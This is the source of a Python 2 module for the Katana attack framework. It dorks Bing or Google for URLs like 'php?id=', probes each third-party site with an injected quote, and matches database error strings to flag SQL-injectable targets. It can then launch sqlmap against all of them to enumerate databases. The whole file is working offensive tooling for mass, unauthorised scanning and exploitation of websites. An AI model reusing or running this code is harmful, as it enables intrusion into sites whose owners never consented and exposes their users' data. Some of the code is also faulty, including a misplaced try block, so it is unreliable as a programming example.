# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework
#
# For adding module: sudo python2 ktf.ktf --i-module path/to/file/without/file/extention
#

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import				  #
from core.KATANAFRAMEWORK import *	#
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES
import commands					# Core library  
import sys						# Quit the shiat
import os						# Working with files and starting sqlmap
import re						# Searching web results for vuln
import requests					# Calling websites
#import urllib.parse			# Parsing url encoding for search
import urllib					# instead of urllib.parse for python2
#import shutil					# Checking if SQLmap is installed
from distutils.spawn import find_executable	# instead of shutil for python2
import subprocess				# Used for running SQLmap
import shlex					# Used for splitting arguments
import psutil					# Checking possible VPN connection
#import http.client				# Ping to check network connection
import httplib					# instead of http.client for python2
from time import sleep			# Multiple use cases, e.g. sleep between requests
from bs4 import BeautifulSoup	# Working with website date			   
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author				="2016 ThomasTJ (TTJ)"
	init.Version			="1.0"
	init.Description		="Google Dork website there are prone to SQL injections."
	init.CodeName			="mcs/gd.sql"
	init.DateCreation		="30/10/2016"	  
	init.LastModification   ="30/10/2016"
	init.References			=None
	init.License			=KTF_LINCENSE
	init.var				={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME				VALUE	 		RQ	  DESCRIPTION
		'basesearch'		:["php?id="		,True ,'Search string'],
		'provider'			:["b"			,True ,'(b)ing/(g)oogle'],
		'maxperpage'		:["25"			,True ,'Results per page'],
		'maxpages'			:["10"			,True ,'Pages to check'],
		'startpage'			:["1"			,True ,'Startpage'],
		'timeout'			:["5"			,True ,'Break between requests'],
		'savesearch'		:["results"		,True ,'Save urls {filename}'],
		'verbose'			:["1"			,False,'Verboselevel: 0,1,2,3'],
		'sqlmap'			:["n"			,False,'sqlmap on results y/n'],
	}
	init.aux = """
 (basesearch) examples
 -> php?id=
 -> php?cat=
 -> php?book=
 -> php?product=
 -> php?productid=
	"""
	return init
# END INFORMATION MODULE

# CODE MODULE	############################################################################################
def main(run):
	
	###############################
	# Crawl the web for URLs
	###############################
	
	print("\n")
	printAlert(0, "Find urls which might is vuln for SQL injections")
	
	#=================================
	# Make variables ready to use
	#=================================
	count = str(init.var['maxperpage'])
	startpage = int(init.var['startpage'])
	pages = (int(init.var['maxpages']) + int(init.var['startpage']))
	sleeptime = int(init.var['timeout'])
	string = str(init.var['basesearch'])
	#stringurl = urllib.parse.quote_plus(string)	# python3
	stringurl = urllib.quote_plus(string)			# python2
	if init.var['verbose'] == "":
		verboseactive = "0"
	else:
		verboseactive = init.var['verbose']
	if init.var['savesearch'] == "":
		filename = "tmp/results"
	else:
		filename = "tmp/" + init.var['savesearch']
	
	rawdata = "tmp/rawurl"
	
	printAlert(0, "Searching")
	printAlert(0, "Results")
	
	
	#=================================
	# Loop through pages - find possible prone urls
	#=================================
	for start in range(startpage,pages):
		
		#=========================
		# Bing search
		#=========================
		if init.var['provider'] == "b":
			counturls = 0
			pagenr = int(start)*int(count)+1
			address = "http://www.bing.com/search?q=instreamset:(url title):" + stringurl + "&count=" + count + "&first=" + str(pagenr)
			printAlert(0, "Page number: " + str(int(start)+1))
			r = requests.get(address)
			soup = BeautifulSoup(r.text, 'lxml')
			for d in soup.find_all('h2'):
				for a in d.find_all('a', href=True):
					if string in a['href']:
						if verboseactive in ('1', '2', '3'):
							print("       " + a['href'])
						with open(rawdata, 'a') as file:
							file.write(a['href'] + "\n")
							counturls = counturls + 1
					elif "0.r.msn." in a['href']:
						pass
					else:
						pass
			printAlert(3, "Urls captured: " + str(counturls))
			printAlert(0, "Sleeping for " + str(sleeptime) + " seconds")
			sleep(sleeptime)   

		#=========================
		# Google search
		#=========================
		elif init.var['provider'] == "g":
			counturls = 0
			pagenr = int(start)*int(count)
			address = "https://www.google.dk/search?q=" + stringurl + "&num=" + count + "&start=" + str(pagenr)
			#address = "https://www.google.dk/search?q=inurl%3A" + stringurl + "&num=" + count + "&start=" + str(pagenr)
			printAlert(0, "Page number: " + str(int(start)+1))
			r = requests.get(address)
			soup = BeautifulSoup(r.text, 'lxml')
			for d in soup.find_all('cite'):
				url = d.text
				if string in url:
					if verboseactive in ('1', '2', '3'):	
						print("       " + url)
					with open(rawdata, 'a') as file:
						file.write(url + "\n")
						counturls = counturls + 1
			printAlert(3, "Urls captured: " + str(counturls))
			printAlert(0, "Sleeping for " + str(sleeptime) + " seconds")
			sleep(sleeptime)
			
		try:
			pass
	
		#=============================
		# Error, end, exit
		#=============================
		# No value - gotta die
		except KeyboardInterrupt:
			printAlert(0, "User input - Ctrl + c")
			quitnow = input ("	Exit program (y/N): ")
			if quitnow == "y":
				printAlert(3, "Exiting\n\n")
				return None
			else:
				printAlert(3, "Continuing\n\n")
		except:
			printAlert(1, "ERROR!!! ")
	
	
	#=================================
	# Done - sum it up
	#=================================
	printAlert(0,"Done scraping")
	#if savesearch == "y":
	if os.path.isfile(rawdata): 
		with open(rawdata) as f:
			resultsnumber = sum(1 for _ in f)
	else:
		printAlert(6, "No URLs captured. Exiting.")
		return None
	printAlert(0,"Total saved urls:  " + str(resultsnumber))
	printAlert(0,"Getting ready for checking urls")
	sleep(1)
	
	
	###############################
	# Check URLs for vuln
	###############################
	
	print("\n")
	printAlert(0, "Check if urls is vuln for SQL injections")
	
	#=================================
	# Base input
	#=================================
	
	
	printAlert(0, "Reading raw url file")
	printAlert(0, "Connecting")
	printAlert(0, "Checking URL's")
	
	#=================================
	# Loop through urls and add a qoute
	#=================================
	
	with open(rawdata) as fileorg:
		
		for line in fileorg:
			checkMY1 = 0
			checkMY2 = 0
			checkMY3 = 0
			checkMY4 = 0
			checkMS1 = 0
			checkMS2 = 0
			checkMS3 = 0
			checkOR1 = 0
			checkOR2 = 0
			checkOR3 = 0
			checkPO1 = 0
			checkPO2 = 0
			try:
				# Get data
				line = line.rstrip('\n')
				url = line + "'"
				if verboseactive in ('1', '2', '3'):	
					printAlert(0, line.strip('\n'))
				r = requests.get(url, verify=False, timeout=4)
				soup = BeautifulSoup(r.text, 'lxml')

				# Check if vuln
				# MySQL
				checkMY1 = len(soup.find_all(text=re.compile('check the manual that corresponds to your MySQL')))
				checkMY2 = len(soup.find_all(text=re.compile('SQL syntax')))
				checkMY3 = len(soup.find_all(text=re.compile('server version for the right syntax')))
				checkMY4 = len(soup.find_all(text=re.compile('expects parameter 1 to be')))
				# Microsoft SQL server
				checkMS1 = len(soup.find_all(text=re.compile('Unclosed quotation mark before the character string')))
				checkMS2 = len(soup.find_all(text=re.compile('An unhanded exception occurred during the execution')))
				checkMS3 = len(soup.find_all(text=re.compile('Please review the stack trace for more information')))
				# Oracle Errors
				checkOR1 = len(soup.find_all(text=re.compile('java.sql.SQLException: ORA-00933')))
				checkOR2 = len(soup.find_all(text=re.compile('SQLExceptionjava.sql.SQLException')))
				checkOR3 = len(soup.find_all(text=re.compile('quoted string not properly terminated')))
				# Postgre SQL
				checkPO1 = len(soup.find_all(text=re.compile('Query failed:')))
				checkPO2= len(soup.find_all(text=re.compile('unterminated quoted string at or near')))
				
				# Verbose level 2
				if verboseactive == "2":
					printAlert(0, "[V]  Check1 MySQL found:	" + str(checkMY1))
					printAlert(0, "[V]  Check2 MySQL found:	" + str(checkMY2))
					printAlert(0, "[V]  Check3 MySQL found:	" + str(checkMY3))
					printAlert(0, "[V]  Check4 MySQL found:	" + str(checkMY4))
					printAlert(0, "[V]  Check5 MS SQL found:   " + str(checkMS1))
					printAlert(0, "[V]  Check6 MS SQL found:   " + str(checkMS2))
					printAlert(0, "[V]  Check7 MS SQL found:   " + str(checkMS3))
					printAlert(0, "[V]  Check8 Oracle found:   " + str(checkOR1))
					printAlert(0, "[V]  Check9 Oracle found:   " + str(checkOR2))
					printAlert(0, "[V]  Check10 Oracle found:  " + str(checkOR3))
					printAlert(0, "[V]  Check11 Postgre found: " + str(checkPO1))
					printAlert(0, "[V]  Check12 Postgre found: " + str(checkPO2))
					
				# Verbose level 3
				if verboseactive == "3":
					checkverMY1 = soup.find(text=re.compile('check the manual that corresponds to your MySQL'))
					checkverMY2 = soup.find(text=re.compile(r'SQL syntax'))
					checkverMY3 = soup.find(text=re.compile(r'server version for the right syntax'))
					checkverMY4 = soup.find(text=re.compile('expects parameter 1 to be'))
					printAlert(0, "[V]  Check1 MySQL found:	" + str(checkverMY1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					printAlert(0, "[V]  Check2 MySQL found:	" + str(checkverMY2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					printAlert(0, "[V]  Check3 MySQL found:	" + str(checkverMY3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					printAlert(0, "[V]  Check4 MySQL found:	" + str(checkverMY4).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					
					checkverMS1 = soup.find(text=re.compile('Unclosed quotation mark before the character string'))
					checkverMS2 = soup.find(text=re.compile('An unhanded exception occurred during the execution'))
					checkverMS3 = soup.find(text=re.compile('Please review the stack trace for more information'))
					printAlert(0, "[V]  Check5 MS SQL found:   " + str(checkverMS1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					printAlert(0, "[V]  Check6 MS SQL found:   " + str(checkverMS2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					printAlert(0, "[V]  Check7 MS SQL found:   " + str(checkverMS3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					
					checkverOR1 = soup.find(text=re.compile('java.sql.SQLException: ORA-00933'))
					checkverOR2 = soup.find(text=re.compile('SQLExceptionjava.sql.SQLException'))
					checkverOR3 = soup.find(text=re.compile('quoted string not properly terminated'))
					printAlert(0, "[V]  Check8 Oracle found:   " + str(checkverOR1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					printAlert(0, "[V]  Check9 Oracle found:   " + str(checkverOR2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					printAlert(0, "[V]  Check10 Oracle found:  " + str(checkverOR3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))

					checkverPO1 = soup.find(text=re.compile('Query failed:'))
					checkverPO2 = soup.find(text=re.compile('unterminated quoted string at or near'))
					printAlert(0, "[V]  Check11 Postgre found: " + str(checkverPO1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					printAlert(0, "[V]  Check12 Postgre found: " + str(checkverPO2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
				
				# If X is vuln
				if (checkMY1 > 0 or checkMY2 > 0 or checkMY3 > 0 or checkMY4 > 0 or checkMS1 > 0 or checkMS2 > 0 or checkMS3 > 0 or checkOR1 > 0 or checkOR2 > 0 or checkOR3 > 0 or checkPO1 > 0 or checkPO2):
					# VULN
					if verboseactive in ('1', '2', '3'):	
						printAlert(3, line)
					with open(filename, 'a') as file:
						file.write(line+"\n")
				else:
					# NOT VULN
					if verboseactive in ('1', '2', '3'):	
						printAlert(6, line)
			
			# Skip X or/and exit
			except KeyboardInterrupt:
				printAlert(1, "  " + line)
				quitnow = input ("  Exit program (y/N): ")
				if quitnow == "y":
					printAlert(0, "Exiting\n\n")
					commands.getoutput('rm '+rawdata+' > null')
					return None
				else:
					printAlert(0, "Continuing\n\n")
					
			# Bad X
			except:
				if verboseactive in ('1', '2', '3'):	
					printAlert(6, "Timeout or error in URL")
			
			   
			   
	#=================================
	# Done - sum it up
	#=================================
	commands.getoutput('rm '+rawdata+' > null')
	printAlert(0, "Done scanning urls")
	if os.path.isfile(filename): 
		with open(filename) as f:
			resultsnumber = sum(1 for _ in f)
	else:
		printAlert(1, "No vuln urls, exiting\n\n")
		return None
	printAlert(0, "Scraping saved in file: " + filename)
	printAlert(0, "Total saved urls:  " + str(resultsnumber))
	
	
	###############################
	# Run the URLs through sqlmap
	###############################
	
	if init.var['sqlmap'] == "y":
		print("\n")
		printAlert(0, "Scan urls with SQLmap")
		
		#=================================
		# Check if sqlmap installed, file, etc.
		#=================================
	
		#if shutil.which('sqlmap') is None: # python3
		if find_executable('sqlmap') is None:
			printAlert(6, "SQLmap is not installed on system - can't go on.")
			printAlert(0, "Install sqlmap and run command below (sudo pacman -S sqlmap, sudo apt-get install sqlmap, etc.)")
			printAlert(0, "\nCommand:")
			printAlert(0, "sqlmap -m \"" + filename + "\n")
			return None
	
		printAlert(0, "SQLmap will be started with arguments dbs, batch, random-agent, 4xthreads.")

		fileDestination = (os.getcwd() + "/" + filename)
		command = ('sqlmap -m ' + fileDestination + " --dbs --batch --random-agent --threads 4")
		printAlert(0, "Command to execute: " + command)
		printAlert(0, "Press Ctrl + c to exit")
		printAlert(0, "Starting sqlmap in 5 sec: " + command)
		printAlert(0, "5..")
		sleep(1)
		printAlert(0, "4..")
		sleep(1)
		printAlert(0, "3..")
		sleep(1)
		printAlert(0, "2..")
		sleep(1)
		printAlert(0, "1..")
		sleep(1)
		
		printAlert(0, "Starting SQLmap - follow onscreen instructions")
		
		# RUN SQLMAP !!
		#commands.getoutput(command)
		os.system(command)
		
	else:
		printAlert(0,"Exiting")
		return None
	
	
# END CODE MODULE ############################################################################################
